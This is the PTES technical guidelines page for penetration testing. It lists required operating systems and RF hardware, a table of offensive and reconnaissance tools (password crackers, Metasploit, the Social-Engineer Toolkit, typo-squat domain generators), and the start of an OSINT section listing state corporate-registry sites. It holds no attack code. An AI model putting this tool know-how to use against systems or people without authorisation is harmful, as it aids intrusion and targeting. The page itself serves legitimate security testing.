

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>PTES Technical Guidelines &mdash; pentest-standard 1.1 documentation</title>
  

  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="genindex.html"/>
        <link rel="search" title="Search" href="search.html"/>
    <link rel="top" title="pentest-standard 1.1 documentation" href="index.html"/> 

  
  <script src="_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="tree.html" class="icon icon-home"> pentest-standard
          

          
          </a>

          
            
            
              <div class="version">
                1.1
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
                <ul>
<li class="toctree-l1"><a class="reference internal" href="index.html">The Penetration Testing Execution Standard</a></li>
<li class="toctree-l1"><a class="reference internal" href="preengagement_interactions.html">Pre-engagement Interactions</a></li>
<li class="toctree-l1"><a class="reference internal" href="intelligence_gathering.html">Intelligence Gathering</a></li>
<li class="toctree-l1"><a class="reference internal" href="threat_modeling.html">Threat Modeling</a></li>
<li class="toctree-l1"><a class="reference internal" href="vulnerability_analysis.html">Vulnerability Analysis</a></li>
<li class="toctree-l1"><a class="reference internal" href="exploitation.html">Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="post_exploitation.html">Post Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="reporting.html">Reporting</a></li>
<li class="toctree-l1"><a class="reference internal" href="faq.html">FAQ</a></li>
<li class="toctree-l1"><a class="reference internal" href="media.html">Media</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="tree.html">pentest-standard</a>
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          

 



<div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="tree.html">Docs</a> &raquo;</li>
      
    <li>PTES Technical Guidelines</li>
      <li class="wy-breadcrumbs-aside">
        
          
            <a href="_sources/technical_guidelines.txt" rel="nofollow"> View page source</a>
          
        
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="ptes-technical-guidelines">
<span id="technical-guidelines"></span><h1>PTES Technical Guidelines<a class="headerlink" href="#ptes-technical-guidelines" title="Permalink to this headline">¶</a></h1>
<p>This section is designed to be the PTES technical guidelines that help
define certain procedures to follow during a penetration test. Something
to be aware of is that these are only baseline methods that have been
used in the industry. They will need to be continuously updated and
changed upon by the community as well as within your own standard.
Guidelines are just that, something to drive you in a direction and help
during certain scenarios, but not an all encompassing set of
instructions on how to perform a penetration test. Think outside of the
box.</p>
<div class="section" id="tools-required">
<h2>Tools Required<a class="headerlink" href="#tools-required" title="Permalink to this headline">¶</a></h2>
<p>Selecting the tools required during a penetration test depends on
several factors such as the type and the depth of the engagement. In
general terms, the following tools are mandatory to complete a
penetration test with the expected results.</p>
<div class="section" id="operating-systems">
<h3>Operating Systems<a class="headerlink" href="#operating-systems" title="Permalink to this headline">¶</a></h3>
<p>Selecting the operating platforms to use during a penetration test is
often critical to the successfully exploitation of a network and
associated system. As such it is a requirement to have the ability to
use the three major operating systems at one time. This is not possible
without virtualization.</p>
<div class="section" id="macos-x">
<h4>MacOS X<a class="headerlink" href="#macos-x" title="Permalink to this headline">¶</a></h4>
<p>MacOS X is a BSD-derived operating. With standard command shells (such
as <em>sh</em>, <em>csh</em>, and <em>bash</em>) and native network utilities that can be
used during a penetration test (including <em>telnet</em>, <em>ftp</em>, <em>rpcinfo</em>,
<em>snmpwalk</em>, <em>host</em>, and <em>dig</em>) it is the system of choice and is the
underlying host system for our penetration testing tools. Since this is
a hardware platform as well, this makes the selection of specific
hardware extremely simple and ensures that all tools will work as
designed.</p>
</div>
<div class="section" id="vmware-workstation">
<h4>VMware Workstation<a class="headerlink" href="#vmware-workstation" title="Permalink to this headline">¶</a></h4>
<p>VMware Workstation is an absolute requirement to allow multiple
instances of operating systems easily on a workstation. VMware
Workstation is a fully supported commercial package, and offers
encryption capabilities and snapshot capabilities that are not available
in the free versions available from VMware. Without the ability to
encrypt the data collected on a VM confidential information will be at
risk, therefore versions that do not support encryption are not to be
used. The operating systems listed below should be run as a guest system
within VMware.</p>
<div class="section" id="linux">
<h5>Linux<a class="headerlink" href="#linux" title="Permalink to this headline">¶</a></h5>
<p>Linux is the choice of most security consultants. The Linux platform is
versatile, and the system kernel provides low-level support for
leading-edge technologies and protocols. All mainstream IP-based attack
and penetration tools can be built and run under Linux with no problems.
For this reason, BackTrack is the platform of choice as it comes with
all the tools required to perform a penetration test.</p>
</div>
<div class="section" id="windows-xp-7">
<h5>Windows XP/7<a class="headerlink" href="#windows-xp-7" title="Permalink to this headline">¶</a></h5>
<p>Windows XP/7 is required for certain tools to be used. Many commercial
tools or Microsoft specific network assessment and penetration tools are
available that run cleanly on the platform.</p>
</div>
</div>
</div>
<div class="section" id="radio-frequency-tools">
<h3>Radio Frequency Tools<a class="headerlink" href="#radio-frequency-tools" title="Permalink to this headline">¶</a></h3>
<div class="section" id="frequency-counter">
<h4>Frequency Counter<a class="headerlink" href="#frequency-counter" title="Permalink to this headline">¶</a></h4>
<p>A Frequency Counter should cover from 10Hz- 3 GHz. A good example of a
reasonably priced frequency counter is the MFJ-886 Frequency Counter.</p>
</div>
<div class="section" id="frequency-scanner">
<h4>Frequency Scanner<a class="headerlink" href="#frequency-scanner" title="Permalink to this headline">¶</a></h4>
<p>A scanner is a radio receiver that can automatically tune, or scan, two
or more discrete frequencies, stopping when it finds a signal on one of
them and then continuing to scan other frequencies when the initial
transmission ceases. These are not to be used in Florida, Kentucky, or
Minnesota unless you are a person who holds a current amateur radio
license issued by the Federal Communications Commission. The required
hardware is the Uniden BCD396T Bearcat Handheld Digital Scanner or
PSR-800 GRE Digital trunking scanner.</p>
</div>
<div class="section" id="spectrum-analyzer">
<h4>Spectrum Analyzer<a class="headerlink" href="#spectrum-analyzer" title="Permalink to this headline">¶</a></h4>
<p>A spectrum analyzer is a device used to examine the spectral composition
of some electrical, acoustic, or optical waveform. A spectrum analyzer
is used to determine whether or not a wireless transmitter is working
according to federally defined standards and is used to determine, by
direct observation, the bandwidth of a digital or analog signal. A good
example of a reasonably priced spectrum analyzer is the Kaltman
Creations HF4060 RF Spectrum Analyzer.</p>
</div>
<div class="section" id="usb-adapter">
<h4>802.11 USB adapter<a class="headerlink" href="#usb-adapter" title="Permalink to this headline">¶</a></h4>
<p>An 802.11 USB adapter allow for the easy connection of a wireless
adapter to the penetration testing system. There are several issues with
using something other than the approved USB adapter as not all of them
support the required functions. The required hardware is the Alfa
AWUS051NH 500mW High Gain 802.11a/b/g/n high power Wireless USB.</p>
</div>
<div class="section" id="external-antennas">
<h4>External Antennas<a class="headerlink" href="#external-antennas" title="Permalink to this headline">¶</a></h4>
<p>External antennas come in a variety of shapes, based upon the usage and
with a variety of connectors. All external antennas must have RP-SMA
connectors that are compatible with the Alfa. Since the Alfa comes with
an Omni-directional antenna, we need to obtain a directional antenna.
The best choice is a panel antenna as it provides the capabilities
required in a package that travels well. The required hardware is the
L-com 2.4 GHz 14 dBi Flat Panel Antenna with RP-SMA connector. A good
magnetic mount Omni-directional antenna such as the L-com 2.4 GHz/900
MHz 3 dBi Omni Magnetic Mount Antenna with RP-SMA Plug Connector is a
good choice.</p>
</div>
<div class="section" id="usb-gps">
<h4>USB GPS<a class="headerlink" href="#usb-gps" title="Permalink to this headline">¶</a></h4>
<p>A GPS is a necessity to properly perform an RF assessment. Without this
it&#8217;s simply impossible to determine where and how far RF signals are
propagating. There are numerous options are available, therefore you
should look to obtain a USB GPS that is supported on operating system
that you are using be that Linux, Windows and Mac OS X.</p>
</div>
</div>
<div class="section" id="software">
<h3>Software<a class="headerlink" href="#software" title="Permalink to this headline">¶</a></h3>
<p>The software requirements are based upon the engagement scope, however
we&#8217;ve listed some commercial and open source software that could be
required to properly conduct a full penetration test.</p>
<table border="1" class="docutils">
<colgroup>
<col width="7%" />
<col width="15%" />
<col width="74%" />
<col width="4%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Software</strong></td>
<td><strong>URL</strong></td>
<td><strong>Description</strong></td>
<td><strong>Windows Only</strong></td>
</tr>
<tr class="row-even"><td>Maltego</td>
<td><a class="reference external" href="http://www.paterva.com/web5">http://www.paterva.com/web5</a></td>
<td>The defacto standard for mining data on individuals and companies. Comes in a free community version and paid version.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>Nessus</td>
<td><a class="reference external" href="http://tenable.com/products/nessus">http://tenable.com/products/nessus</a></td>
<td>A vulnerabilty scanning tool available in paid and free versions. Nessus is useful for finding and documenting vulnerabilities mostly from the inside of a given network.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>IBM AppScan</td>
<td><a class="reference external" href="http://www-01.ibm.com/software/awdtools/appscan">http://www-01.ibm.com/software/awdtools/appscan</a></td>
<td>IBM&#8217;s automated Web application security testing suite.</td>
<td><strong>*</strong></td>
</tr>
<tr class="row-odd"><td>eEye Retina</td>
<td><a class="reference external" href="http://www.eeye.com/Products/Retina.aspx">http://www.eeye.com/Products/Retina.aspx</a></td>
<td>Retina is an an automated network vulnerability scanner that can be managed from a single web-based console. It can be used in conjunction with Metasploit where if an exploit exists in Metasploit, it can be launched directly from Retina to verify that the vulnerability exists.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>Nexpose</td>
<td><a class="reference external" href="http://www.rapid7.com">http://www.rapid7.com</a></td>
<td>Nexpose is a vulnerability scanner from the same company that brings you Metasploit. Available in both free and paid versions that differ in levels of support and features.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>OpenVAS</td>
<td><a class="reference external" href="http://www.openvas.org">http://www.openvas.org</a></td>
<td>OpenVAS is a vulnerability scanner that originally started as a fork of the Nessus project. The actual security scanner is accompanied with a daily updated feed of Network Vulnerability Tests (NVTs), over 20,000 in total (as of January 2011)</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>HP WebInspect</td>
<td><a class="reference external" href="https://www.fortify.com/products/web_inspect.html">https://www.fortify.com/products/web_inspect.html</a></td>
<td>HP WebInspect performs web application security testing and assessment for complex web applications. Supports JavaScript, Flash, Silverlight and others.</td>
<td><strong>*</strong></td>
</tr>
<tr class="row-odd"><td>HP SWFScan</td>
<td><a class="reference external" href="https://h30406.www3.hp.com/campaigns/2009/wwcampaign/1-5TUVE/index.php?key=swf">https://h30406.www3.hp.com/campaigns/2009/wwcampaign/1-5TUVE/index.php?key=swf</a></td>
<td>HP SWFScan is a free tool developed by HP Web Security Research Group to automatically find security vulnerabilities in applications built on the Flash platform. Useful for decompiling flash apps and finding hard-coded credentials, etc.</td>
<td><strong>*</strong></td>
</tr>
<tr class="row-even"><td>Backtrack Linux</td>
<td><a class="reference external" href="http://www.backtrack-linux.org">1</a></td>
<td>One of the most complete penetration testing Linux distributions available. Includes many of the more popular free pentesting tools but is based on Ubuntu so it&#8217;s also easily expandable. Can be run on Live CD, USB key, VM or installed on a hard drive.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>SamuraiWTF (Web Testing Framework)</td>
<td><a class="reference external" href="http://samurai.inguardians.com">http://samurai.inguardians.com</a></td>
<td>A live Linux distribution built for the specific purpose of web application scanning. Includes tools such as Fierce, Maltego, WebScarab, BeEF any many more tools specific to web application testing.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>SiteDigger</td>
<td><a class="reference external" href="http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx">http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx</a></td>
<td>SiteDigger 3.0 is a free tool that runs on Windows. It searches Google’s cache to look for vulnerabilities, errors, configuration issues, proprietary information, and interesting security nuggets on web sites.</td>
<td><strong>*</strong></td>
</tr>
<tr class="row-odd"><td>FOCA</td>
<td><a class="reference external" href="http://www.informatica64.com/DownloadFOCA">http://www.informatica64.com/DownloadFOCA</a></td>
<td>FOCA is a tool that allows you to find out more about a website by (amongst other things) analysing the metadata in any documents it makes available.</td>
<td><strong>*</strong></td>
</tr>
<tr class="row-even"><td>THC IPv6 Attack Toolkit</td>
<td><a class="reference external" href="http://www.thc.org/thc-ipv6">http://www.thc.org/thc-ipv6</a></td>
<td>The largest single collection of tools designed to exploit vulnerabilities in the IPv6 and ICMP6 protocols.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>THC Hydra</td>
<td><a class="reference external" href="http://thc.org/thc-hydra/">http://thc.org/thc-hydra/</a></td>
<td>Hydra is a very fast network logon brute force cracker which can attack many different services and resources.</td>
<td><strong>*</strong></td>
</tr>
<tr class="row-even"><td>Cain</td>
<td><a class="reference external" href="http://www.oxid.it/cain.html">http://www.oxid.it/cain.html</a></td>
<td>Cain &amp; Abel is a password recovery tool that runs on Windows. It allows easy recovery of various kind of passwords by sniffing the network, cracking encrypted passwords using Dictionary, Brute-Force and Cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, recovering wireless network keys, revealing password boxes, uncovering cached passwords and analyzing routing protocols.</td>
<td><strong>*</strong></td>
</tr>
<tr class="row-odd"><td>cree.py</td>
<td><a class="reference external" href="http://ilektrojohn.github.com/creepy/">http://ilektrojohn.github.com/creepy/</a></td>
<td>cree.py gathers geolocation related information from social networking platforms and image hosting services. Then the information is presented in a map where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to provide context.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>inSSIDer</td>
<td><a class="reference external" href="http://www.metageek.net/products/inssider">http://www.metageek.net/products/inssider</a></td>
<td>inSSIDer is a free gui-based wifi discovery and troubleshooting tool for Windows</td>
<td><strong>*</strong></td>
</tr>
<tr class="row-odd"><td>Kismet Newcore</td>
<td><a class="reference external" href="http://www.kismetwireless.net">http://www.kismetwireless.net</a></td>
<td>Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system. Kismet passively collects packets from both named and hidden networks with any wireless adapter that supports raw monitor mode.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>Rainbow Crack</td>
<td><a class="reference external" href="http://project-rainbowcrack.com">http://project-rainbowcrack.com</a></td>
<td>Rainbow Crack is a password cracker that will run a pre-computed rainbow table against a given series of hashes.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>dnsenum</td>
<td><a class="reference external" href="http://code.google.com/p/dnsenum">http://code.google.com/p/dnsenum</a></td>
<td>Think of dnsenum as a supercharged version of a whois query. It not only discovers all of the dns records but it goes a step further and attempts to use google to discover subdomains, discovers BIND versions and more.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>dnsmap</td>
<td><a class="reference external" href="http://code.google.com/p/dnsmap">http://code.google.com/p/dnsmap</a></td>
<td>Dnsmap is a passive dns mapper that is used for subdomain bruteforce discovery.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>dnsrecon</td>
<td><a class="reference external" href="http://www.darkoperator.com/tools-and-scripts/">http://www.darkoperator.com/tools-and-scripts/</a></td>
<td>DNS enumeration script written in ruby for performing TLD expansion, SRV record enumeration, host and subdomain brute force, zone transfer, reverse lookup and general record identification.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>dnstracer</td>
<td><a class="reference external" href="http://www.mavetju.org/unix/dnstracer.php">http://www.mavetju.org/unix/dnstracer.php</a></td>
<td>dnstracer determines where a given Domain Name Server (DNS) gets its information from and follows the chain of DNS servers back to the servers which know the data.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>dnswalk</td>
<td><a class="reference external" href="http://sourceforge.net/projects/dnswalk">http://sourceforge.net/projects/dnswalk</a></td>
<td>Dnswalk is a DNS debugger. It performs zone transfers of specified domains, and checks the database in numerous ways for internal consistency, as well as accuracy.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>Fierce</td>
<td><a class="reference external" href="http://ha.ckers.org/fierce">http://ha.ckers.org/fierce</a></td>
<td>Fierce domain scan discovers non-contiguous IP ranges of a network.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>Fierce2</td>
<td><a class="reference external" href="http://trac.assembla.com/fierce/">http://trac.assembla.com/fierce/</a></td>
<td>Fierce 2 is an updated version that is maintained by a new group of developers.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>FindDomains</td>
<td><a class="reference external" href="http://code.google.com/p/finddomains">http://code.google.com/p/finddomains</a></td>
<td>FindDomains is a multithreaded search engine discovery tool that will be very useful for penetration testers dealing with discovering domain names/web sites/virtual hosts which are located on too many IP addresses. Provides a console interface so you can easily integrate this tool to your pentesting automation system.</td>
<td><strong>*</strong></td>
</tr>
<tr class="row-odd"><td>HostMap</td>
<td><a class="reference external" href="http://hostmap.lonerunners.net">http://hostmap.lonerunners.net</a></td>
<td>hostmap is a free and automatic tool that enables the discovery of all hostnames and virtual hosts on a given IP address.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>URLcrazy</td>
<td><a class="reference external" href="http://www.morningstarsecurity.com/research/urlcrazy">http://www.morningstarsecurity.com/research/urlcrazy</a></td>
<td>URLCrazy is a domainname typo generator. This will allow you to find squatted domains related to your target company and possibly generate some of your own.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>theHarvester</td>
<td><a class="reference external" href="http://www.edge-security.com/theHarvester.php">http://www.edge-security.com/theHarvester.php</a></td>
<td>theHarvester is a tool for gathering e-mail accounts, user names and hostnames/subdomains from different public sources like search engines and PGP key servers.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>The Metasploit Framework</td>
<td><a class="reference external" href="http://metasploit.com">http://metasploit.com</a></td>
<td>Metasploit is an ever-growing collection of remote exploits and post exploitation tools for all platforms. You will want to constantly run svn updates on this tool since new features and exploits are added nearly daily. Metasploit is both incredibly powerful and complex. For further guidance, check out this book <a class="reference external" href="http://nostarch.com/metasploit.htm">http://nostarch.com/metasploit.htm</a> .</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>The Social-Engineer Toolkit (SET)</td>
<td><a class="reference external" href="http://www.secmaniac.com/download/">http://www.secmaniac.com/download/</a></td>
<td>The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks against the human element. Amongst other things, SET allows you to craft malcious emails and dummy websites based on legitimate ones to compliment a social engineering attack.</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>Fast-Track</td>
<td><a class="reference external" href="http://www.secmaniac.com/download/">http://www.secmaniac.com/download/</a></td>
<td>Fast-Track is an automated pentesting tool suite. Many of the issues Fast-Track exploits are due to improper sanitizing of client-side data within web applications, patch management, or lack of hardening techniques. It runs on Linux and depends on Metasploit 3.</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
</div>
</div>
<hr class="docutils" />
<div class="section" id="intelligence-gathering">
<h2>Intelligence Gathering<a class="headerlink" href="#intelligence-gathering" title="Permalink to this headline">¶</a></h2>
<p>Intelligence Gathering is the phase where data or &#8220;intelligence&#8221; is
gathered to assist in guiding the assessment actions. At the broadest
level this intelligence gathering includes information about employees,
facilities, products and plans. Within a larger picture this
intelligence will include potentially secret or private &#8220;intelligence&#8221;
of a competitor, or information that is otherwise relevant to the
target.</p>
<div class="section" id="osint">
<h3>OSINT<a class="headerlink" href="#osint" title="Permalink to this headline">¶</a></h3>
<p>Open Source Intelligence (OSINT) in the simplest of terms is locating,
and analyzing publically (open) available sources of information. The
key component here is that this intelligence gathering process has a
goal of producing current and relevant information that is valuable to
either an attacker or competitor. For the most part, OSINT is more than
simply performing web searches using various sources.</p>
<div class="section" id="corporate">
<h4>Corporate<a class="headerlink" href="#corporate" title="Permalink to this headline">¶</a></h4>
<p>Information on a particular target should include information regarding
the legal entity. Most states within the US require Corporations,
limited liability companies and limited partnerships to file with the
State division. This division serves as custodian of the filings and
maintains copies and/or certifications of the documents and filings.
This information may contain information regarding shareholders,
members, officers or other persons involved in the target entity.</p>
<table border="1" class="docutils">
<colgroup>
<col width="13%" />
<col width="87%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>State</strong></td>
<td><strong>URL</strong></td>
</tr>
<tr class="row-even"><td>Alabama</td>
<td><a class="reference external" href="http://sos.alabama.gov/BusinessServices/NameRegistration.aspx">http://sos.alabama.gov/BusinessServices/NameRegistration.aspx</a></td>
</tr>
<tr class="row-odd"><td>Alaska</td>
<td><a class="reference external" href="http://www.dced.state.ak.us/bsc/corps.htm">http://www.dced.state.ak.us/bsc/corps.htm</a></td>
</tr>
<tr class="row-even"><td>Arizona</td>
<td><a class="reference external" href="http://starpas.azcc.gov/scripts/cgiip.exe/WService=wsbroker1/main.p">http://starpas.azcc.gov/scripts/cgiip.exe/WService=wsbroker1/main.p</a></td>
</tr>
<tr class="row-odd"><td>Arkansas</td>
<td><a class="reference external" href="http://www.sosweb.state.ar.us/corps/incorp">http://www.sosweb.state.ar.us/corps/incorp</a></td>
</tr>
<tr class="row-even"><td>California</td>
<td><a class="reference external" href="http://kepler.sos.ca.gov/">http://kepler.sos.ca.gov/</a></td>
</tr>
<tr class="row-odd"><td>Colorado</td>
<td><a class="reference external" href="http://www.state.co.us/">http://www.state.co.us</a></td>
</tr>
<tr class="row-even"><td>Connecticut</td>
<td><a class="reference external" href="http://www.state.ct.us/">http://www.state.ct.us</a></td>
</tr>
<tr class="row-odd"><td>Delaware</td>
<td><a class="reference external" href="http://www.state.de.us/">http://www.state.de.us</a></td>
</tr>
<tr class="row-even"><td>District of Columbia</td>
<td><a class="reference external" href="http://www.ci.washington.dc.us/">http://www.ci.washington.dc.us</a></td>
</tr>
<tr class="row-odd"><td>Florida</td>
<td><a class="reference external" href="http://www.sunbiz.org/search.html">http://www.sunbiz.org/search.html</a></td>
</tr>
<tr class="row-even"><td>Georgia</td>
<td><a class="reference external" href="http://corp.sos.state.ga.us/corp/soskb/CSearch.asp">http://corp.sos.state.ga.us/corp/soskb/CSearch.asp</a></td>
</tr>
<tr class="row-odd"><td>Hawaii</td>
<td><a class="reference external" href="http://www.state.hi.us/">http://www.state.hi.us</a></td>
</tr>
<tr class="row-even"><td>Idaho</td>
<td><a class="reference external" href="http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep=crit">http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep=crit</a></td>
</tr>
<tr class="row-odd"><td>Illinois</td>
<td><a class="reference external" href="http://www.ilsos.gov/corporatellc">http://www.ilsos.gov/corporatellc</a></td>
</tr>
<tr class="row-even"><td>Indiana</td>
<td><a class="reference external" href="http://secure.in.gov/sos/bus_service/online_corps/default.asp">http://secure.in.gov/sos/bus_service/online_corps/default.asp</a></td>
</tr>
<tr class="row-odd"><td>Iowa</td>
<td><a class="reference external" href="http://www.state.ia.us/">http://www.state.ia.us</a></td>
</tr>
<tr class="row-even"><td>Kansas</td>
<td><a class="reference external" href="http://www.accesskansas.org/apps/corporations.html">http://www.accesskansas.org/apps/corporations.html</a></td>
</tr>
<tr class="row-odd"><td>Kentucky</td>
<td><a class="reference external" href="http://ukcc.uky.edu/~vitalrec">http://ukcc.uky.edu/~vitalrec</a></td>
</tr>
<tr class="row-even"><td>Louisiana</td>
<td><a class="reference external" href="http://www.sec.state.la.us/crpinq.htm">http://www.sec.state.la.us/crpinq.htm</a></td>
</tr>
<tr class="row-odd"><td>Maine</td>
<td><a class="reference external" href="http://www.state.me.us/sos/cec/corp/ucc.htm">http://www.state.me.us/sos/cec/corp/ucc.htm</a></td>
</tr>
<tr class="row-even"><td>Maryland</td>
<td><a class="reference external" href="http://sdatcert3.resiusa.org/ucc-charter">http://sdatcert3.resiusa.org/ucc-charter</a></td>
</tr>
<tr class="row-odd"><td>Massachusetts</td>
<td><a class="reference external" href="http://ucc.sec.state.ma.us/psearch/default.asp">http://ucc.sec.state.ma.us/psearch/default.asp</a></td>
</tr>
<tr class="row-even"><td>Michigan</td>
<td><a class="reference external" href="http://www.cis.state.mi.us/bcs_corp/sr_corp.asp">http://www.cis.state.mi.us/bcs_corp/sr_corp.asp</a></td>
</tr>
<tr class="row-odd"><td>Minnesota</td>
<td><a class="reference external" href="http://www.state.mn.us/">http://www.state.mn.us/</a></td>
</tr>
<tr class="row-even"><td>Mississippi</td>
<td><a class="reference external" href="http://www.sos.state.ms.us/busserv/corpsnap">http://www.sos.state.ms.us/busserv/corpsnap</a></td>
</tr>
<tr class="row-odd"><td>Missouri</td>
<td><a class="reference external" href="http://www.state.mo.us/">http://www.state.mo.us</a></td>
</tr>
<tr class="row-even"><td>Montana</td>
<td><a class="reference external" href="http://sos.state.mt.us/">http://sos.state.mt.us</a></td>
</tr>
<tr class="row-odd"><td>Nebraska</td>
<td><a class="reference external" href="http://www.sos.state.ne.us/htm/UCCmenu.htm">http://www.sos.state.ne.us/htm/UCCmenu.htm</a></td>
</tr>
<tr class="row-even"><td>Nevada</td>
<td><a class="reference external" href="http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm">http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm</a></td>
</tr>
<tr class="row-odd"><td>New Hampshire</td>
<td><a class="reference external" href="http://www.state.nh.us/">http://www.state.nh.us</a></td>
</tr>
<tr class="row-even"><td>New Jersey</td>
<td><a class="reference external" href="http://www.state.nj.us/treasury/revenue/searchucc.htm">http://www.state.nj.us/treasury/revenue/searchucc.htm</a></td>
</tr>
<tr class="row-odd"><td>New Mexico</td>
<td><a class="reference external" href="http://www.sos.state.nm.us/UCC/UCCSRCH.HTM">http://www.sos.state.nm.us/UCC/UCCSRCH.HTM</a></td>
</tr>
<tr class="row-even"><td>New York</td>
<td><a class="reference external" href="http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show">http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show</a></td>
</tr>
<tr class="row-odd"><td>North Carolina</td>
<td><a class="reference external" href="http://www.secstate.state.nc.us/research.htm">http://www.secstate.state.nc.us/research.htm</a></td>
</tr>
<tr class="row-even"><td>North Dakota</td>
<td><a class="reference external" href="http://www.state.nd.us/sec">http://www.state.nd.us/sec</a></td>
</tr>
<tr class="row-odd"><td>Ohio</td>
<td><a class="reference external" href="http://serform.sos.state.oh.us/pls/report/report.home">http://serform.sos.state.oh.us/pls/report/report.home</a></td>
</tr>
<tr class="row-even"><td>Oklahoma</td>
<td><a class="reference external" href="http://www.oklahomacounty.org/coclerk/ucc/default.asp">http://www.oklahomacounty.org/coclerk/ucc/default.asp</a></td>
</tr>
<tr class="row-odd"><td>Oregon</td>
<td><a class="reference external" href="http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login">http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login</a></td>
</tr>
<tr class="row-even"><td>Pennsylvania</td>
<td><a class="reference external" href="http://www.dos.state.pa.us/DOS/site/default.asp">http://www.dos.state.pa.us/DOS/site/default.asp</a></td>
</tr>
<tr class="row-odd"><td>Rhode Island</td>
<td><a class="reference external" href="http://155.212.254.78/">http://155.212.254.78</a></td>
</tr>
<tr class="row-even"><td>South Carolina</td>
<td><a class="reference external" href="http://www.scsos.com/corp_search.htm">http://www.scsos.com/corp_search.htm</a></td>
</tr>
<tr class="row-odd"><td>South Dakota</td>
<td><a class="reference external" href="http://www.state.sd.us/">http://www.state.sd.us</a></td>
</tr>
<tr class="row-even"><td>Tennessee</td>
<td><a class="reference external" href="http://www.state.tn.us/sos/service.htm">http://www.state.tn.us/sos/service.htm</a></td>
</tr>
<tr class="row-odd"><td>Texas</td>
<td><a class="reference external" href="https://ourcpa.cpa.state.tx.us/coa/Index.html">https://ourcpa.cpa.state.tx.us/coa/Index.html</a></td>
</tr>
<tr class="row-even"><td>Utah</td>
<td><a class="reference external" href="http://www.commerce.state.ut.us/">http://www.commerce.state.ut.us</a></td>
</tr>
<tr class="row-odd"><td>Vermont</td>
<td><a class="reference external" href="http://www.sec.state.vt.us/seek/database.htm">http://www.sec.state.vt.us/seek/database.htm</a></td>
</tr>
<tr class="row-even"><td>Virginia</td>
<td><a class="reference external" href="http://www.state.va.us/">http://www.state.va.us</a></td>
</tr>
<tr class="row-odd"><td>Washington</td>
<td><a class="reference external" href="http://www.dol.wa.gov/business/UCC/">http://www.dol.wa.gov/business/UCC/</a></td>
</tr>
<tr class="row-even"><td>West Virginia</td>
<td><a class="reference external" href="http://www.wvsos.com/wvcorporations">http://www.wvsos.com/wvcorporations</a></td>
</tr>
<tr class="row-odd"><td>Wisconsin</td>
<td><a class="reference external" href="http://www.wdfi.org/corporations/crispix">http://www.wdfi.org/corporations/crispix</a></td>
</tr>
<tr class="row-even"><td>Wyoming</td>
<td><a class="reference external" href="http://soswy.state.wy.us/Corp_Search_Main.asp">http://soswy.state.wy.us/Corp_Search_Main.asp</a></td>
</tr>
